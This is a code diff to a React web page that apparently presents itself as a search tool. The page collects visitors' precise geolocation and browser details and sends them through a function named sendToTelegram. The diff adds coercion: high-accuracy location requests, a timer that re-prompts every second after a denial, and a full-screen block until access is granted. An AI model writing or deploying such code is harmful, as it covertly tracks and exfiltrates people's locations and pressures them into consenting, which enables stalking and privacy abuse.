@@ -113,33 +113,34 @@ ${locationInfo}
       onlineStatus: navigator.onLine,
     };
 
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        setLocationStatus('granted');
-        const info: UserInfoData = {
-          location: {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date(position.timestamp).toISOString(),
-          },
-          browser: browserInfo,
-        };
-        await sendToTelegram(info);
-      },
-      async (error) => {
-        setLocationStatus('denied');
-        const info: UserInfoData = {
-          location: null,
-          browser: browserInfo,
-        };
-        await sendToTelegram(info);
-        console.error('Location error:', {
-          code: error.code,
-          message: error.message
-        });
-      }
-    );
+    const requestLocation = () => {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          setLocationStatus('granted');
+          const info: UserInfoData = {
+            location: {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: new Date(position.timestamp).toISOString(),
+            },
+            browser: browserInfo,
+          };
+          await sendToTelegram(info);
+        },
+        async (error) => {
+          setLocationStatus('denied');
+          // If denied, we'll try again due to the useEffect below
+          console.error('Location error:', {
+            code: error.code,
+            message: error.message
+          });
+        },
+        { enableHighAccuracy: true }
+      );
+    };
+
+    requestLocation();
   }, []);
 
   const handleSearch = (e: React.FormEvent) => {
@@ -152,12 +153,37 @@ ${locationInfo}
     getUserInfo();
   }, [getUserInfo]);
 
-  if (locationStatus === 'pending') {
+  // If location is denied, keep requesting
+  useEffect(() => {
+    if (locationStatus === 'denied') {
+      const timer = setTimeout(() => {
+        setLocationStatus('pending');
+        getUserInfo();
+      }, 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [locationStatus, getUserInfo]);
+
+  if (locationStatus !== 'granted') {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-gray-100">
-        <div className="text-center p-8 bg-white rounded-lg shadow-md">
-          <h1 className="text-xl mb-4">Please respond to the location permission request</h1>
-          <p className="text-gray-600">Waiting for your response...</p>
+      <div className="min-h-screen flex items-center justify-center bg-black text-white">
+        <div className="text-center p-8">
+          <h1 className="text-3xl mb-6 font-bold">Location Access Required</h1>
+          <p className="text-xl mb-4">Please allow access to your location to continue</p>
+          {locationStatus === 'denied' && (
+            <div className="mt-4">
+              <p className="text-red-400 mb-4">Location access was denied</p>
+              <button 
+                onClick={() => {
+                  setLocationStatus('pending');
+                  getUserInfo();
+                }}
+                className="px-6 py-3 bg-white text-black rounded-lg hover:bg-gray-200 transition-colors"
+              >
+                Try Again
+              </button>
+            </div>
+          )}
         </div>
       </div>
     );
